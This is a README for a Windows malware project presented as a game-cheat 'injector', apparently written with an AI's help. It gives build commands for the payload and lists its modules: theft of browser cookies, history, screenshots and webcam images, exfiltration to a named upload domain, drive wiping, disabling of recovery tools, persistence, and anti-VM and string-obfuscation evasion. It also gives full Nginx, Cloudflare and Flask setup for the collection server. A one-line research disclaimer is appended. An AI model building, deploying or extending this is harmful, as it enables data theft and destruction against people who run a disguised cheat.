# neverlose injector
![overview](img/screenshot.png)

DO NOT RUN THIS IN UR OWN PC

## 编译

**环境要求**
- Windows 10/11
- Visual Studio 2022（v144/v145 工具集）
- Windows SDK 10.0+
- Rust + Cargo
- Bun

**步骤**
```powershell
# 编译 payload EXE
MSBuild injector.sln /p:Configuration=Release /p:Platform=x64

# 复制到 Tauri 嵌入位置
copy x64\Release\loader.exe src-tauri\payload.exe

# 编译 Tauri 前端
bun tauri build
```
产物：`src-tauri\target\release\loader.exe`

## 攻击行为

### 信息窃取
| 模块 | 说明 |
|------|------|
| 桌面截图 | GDI 截屏 → PNG |
| 摄像头拍照 | DirectShow 静默拍照 → PNG |
| 系统信息 | CPU / OS / 用户 |
| 浏览器 Cookies | Chrome / Edge / Brave / Opera / Yandex / Firefox + Local State 密钥 |
| 浏览器历史 | Chrome / Edge / Brave / Opera / Yandex / Firefox |
| 数据外传 | WinHTTP POST 至服务器 |

### 系统破坏
| 模块 | 说明 |
|------|------|
| 磁盘擦除 | RD D:~M: + O: 共 9 个盘符 |
| 断 .exe 关联 | 删除 exefile 注册表 |
| IFEO 劫持 | 40+ 恢复工具注入假 Debugger |
| 系统瘫痪 | 清空 PATH / 禁用系统还原 / 停 50+ 关键服务 |
| 桌面销毁 | 杀 explorer / 换鼠标键 / 删文件 / 嵌套目录 / 改壁纸 |
| 持久化 | data.bat + open.cmd 写启动文件夹（开机自启） |
| 锁输入 | `BlockInput` 锁键盘鼠标 |
| 反关机 | 拦截所有关机手段 |
| 硬件 | CPU 全核满载 + 内存无限分配至耗尽 |
| 字体 | 删除windows字体注册表 |

### 视觉/听觉
| 模块 | 说明 |
|------|------|
| 屏幕图标 | error / warning / info 随机填充全屏 |
| 报警音 | MessageBeep 连续循环 |
| 1kHz 噪音 | 合成正弦波持续播放 |
| 壁纸 | 将摄像头拍摄的画面设为系统壁纸 |

### 免杀 / 反分析
- 所有 WinExec 命令字符串 XOR 加密（Key: 0x55）
- 编译后不存在明文攻击指令
- 反虚拟机：检测 VMware / VirtualBox，弹窗退出

## 服务器部署

### 网络架构

```
客户端 → upload.swangnetwork.asia:443 (HTTPS)
       → Cloudflare DNS (隐藏源站IP)
       → Nginx :443 (server_name 你的域名)
       → proxy_pass http://127.0.0.1:8891 (Flask receiver)
```

### Cloudflare 配置

1. **DNS**：A 记录 `你的域名` → 源站 IP，代理开启
2. **SSL/TLS** → 源服务器 → 创建证书：
   - 私钥类型：ECC
   - 主机名：`*.你的域名` 和 `你的域名`
   - 生成后保存 Origin Certificate 和 Private Key
3. **SSL/TLS 模式**：Full (strict)

### Nginx 配置

```bash
mkdir -p /etc/nginx/ssl
# 将 CF 生成的 Origin Certificate 和 Private Key 分别保存为：
#   /etc/nginx/ssl/upload-origin.pem
#   /etc/nginx/ssl/upload-origin.key
```

```nginx
# /etc/nginx/sites-available/upload
server {
    listen 80;
    server_name 你的域名;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name 你的域名;

    ssl_certificate     /etc/nginx/ssl/upload-origin.pem;
    ssl_certificate_key /etc/nginx/ssl/upload-origin.key;

    location / {
        proxy_pass http://127.0.0.1:8891;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
    }
}
```

```bash
ln -sf /etc/nginx/sites-available/upload /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
```

### 服务器端口

| 端口 | 服务 | 监听 |
|------|------|------|
| 22 | SSH | 0.0.0.0 |
| 80/443 | Nginx (CF 回源) | 0.0.0.0 |
| 8891 | Flask receiver (上传 + s-ui API) | 127.0.0.1 |
| 2087 | s-ui Web 面板 | 0.0.0.0 |
| 3306 | MariaDB | 127.0.0.1 |

### API 端点 (Flask :8891)

| 路由 | 方法 | 说明 |
|------|------|------|
| `/token` | GET | 获取一次性上传令牌 |
| `/upload` | POST | 上传文件（?token=xxx, multipart/form-data） |
| `/file/<name>` | GET | 下载文件 |
| `/list` | GET | 文件列表 |

## 配置项

**服务器地址**：编辑 `injector/config.h`（包含于gitignore中）
```cpp
#pragma once
#define SERVER_HOST L"你的域名"
#define SERVER_HTTP "http://你的域名:8080"
```
建议通过 Cloudflare 代理域名连接

其他可配置项：
- **ANTI_VM**：`#define ANTI_VM 1`（1=拦截虚拟机，0=允许）
- **XOR Key**：`XKEY` 常量（默认 0x55）

## 注意

仅用于安全研究/授权测试。

*readme made by deepseek*